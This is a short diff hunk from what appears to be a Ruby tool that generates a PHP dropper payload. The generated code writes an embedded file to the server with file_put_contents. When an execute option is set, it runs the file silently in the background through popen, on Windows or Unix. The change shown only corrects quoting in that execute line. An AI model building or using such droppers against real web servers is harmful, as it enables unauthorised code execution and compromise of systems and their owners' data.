@@ -67,7 +67,7 @@ enc.each_line {|l|
 encoded += "\");$a=file_put_contents(\"#{name}\",$i);"
 
 encoded += "if ($a) echo 'file written successfully. '; else echo 'error writing file. ';" if options[:verbose]
-encoded += "if(PHP_OS == 'WINNT' || PHP_OS == 'WIN32') pclose(popen('start /b #{name}', 'r')); else pclose(popen(#{name}.' >> /dev/null &', 'r'));" if options[:execute]
+encoded += "if(PHP_OS == 'WINNT' || PHP_OS == 'WIN32') pclose(popen('start /b #{name}', 'r')); else pclose(popen('#{name} >> /dev/null &', 'r'));" if options[:execute]
 encoded += "echo 'file executed.';" if options[:verbose] and options[:execute]
 encoded+= " ?>"
 
